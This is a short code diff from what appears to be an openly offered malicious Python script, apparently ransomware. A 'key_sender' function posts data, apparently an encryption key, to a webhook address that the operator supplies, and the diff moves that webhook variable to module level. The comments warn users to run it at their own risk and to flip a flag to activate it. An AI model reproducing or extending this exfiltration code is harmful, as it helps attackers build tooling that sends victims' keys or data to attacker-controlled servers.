@@ -8,10 +8,10 @@ from string import ascii_uppercase
 # Use it at your own risk.
 # If you want to run this script change the 0 to 1
 Run_it_at_your_own_RISK = 0
+webhook = "Your webhook API"  # change this to your webhook API
 
 def key_sender(data):
     try:
-        webhook = "Your webhook API"    # change this to your webhook API
         post(webhook, data)
     except Exception as e:
         print("[-]failed to send the key, error: ", e)
